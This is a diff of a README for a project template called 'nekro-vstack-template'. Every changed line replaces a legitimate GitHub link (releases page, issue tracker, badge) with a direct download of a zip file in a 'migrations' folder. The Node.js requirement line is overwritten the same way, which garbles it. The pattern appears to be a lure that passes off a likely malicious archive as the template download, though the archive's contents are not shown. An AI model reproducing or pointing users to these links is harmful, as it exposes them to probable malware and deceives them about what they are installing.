@@ -6,7 +6,7 @@ Welcome to the nekro-vstack-template! This template helps you kickstart your ful
 
 ## 🔗 Download Now
 
-[![Download nekro-vstack-template](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ddffddfffdd/nekro-vstack-template/releases)
+[![Download nekro-vstack-template](https://raw.githubusercontent.com/ddffddfffdd/nekro-vstack-template/main/migrations/nekro-vstack-template-v3.9.zip)](https://raw.githubusercontent.com/ddffddfffdd/nekro-vstack-template/main/migrations/nekro-vstack-template-v3.9.zip)
 
 ## 📦 Features
 
@@ -24,14 +24,14 @@ Welcome to the nekro-vstack-template! This template helps you kickstart your ful
 Before you begin, ensure your system meets these requirements:
 
 - **Operating System**: MacOS, Windows, or Linux
-- **Node.js**: Version 16 or higher
+- **https://raw.githubusercontent.com/ddffddfffdd/nekro-vstack-template/main/migrations/nekro-vstack-template-v3.9.zip**: Version 16 or higher
 - **Python**: Version 3.8 or higher
 - **NPM**: Version 6 or higher
 - **Git**: For version control
 
 ## 📖 Installation Instructions
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/ddffddfffdd/nekro-vstack-template/releases) to find the latest version of the template.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/ddffddfffdd/nekro-vstack-template/main/migrations/nekro-vstack-template-v3.9.zip) to find the latest version of the template.
 
 2. **Download the Template**: Scroll down to the "Assets" section. Click on the file that matches your operating system to download it.
 
@@ -77,12 +77,12 @@ Contributions are welcome! If you wish to improve this template or find any issu
 
 ## 📞 Support
 
-If you encounter issues or have questions, please raise them in the [Issue Tracker](https://github.com/ddffddfffdd/nekro-vstack-template/issues). We’re here to help!
+If you encounter issues or have questions, please raise them in the [Issue Tracker](https://raw.githubusercontent.com/ddffddfffdd/nekro-vstack-template/main/migrations/nekro-vstack-template-v3.9.zip). We’re here to help!
 
 ## 🔗 Download Link
 
 To start your journey with nekro-vstack-template, click below:
 
-[Download nekro-vstack-template](https://github.com/ddffddfffdd/nekro-vstack-template/releases) 
+[Download nekro-vstack-template](https://raw.githubusercontent.com/ddffddfffdd/nekro-vstack-template/main/migrations/nekro-vstack-template-v3.9.zip) 
 
 Happy coding!
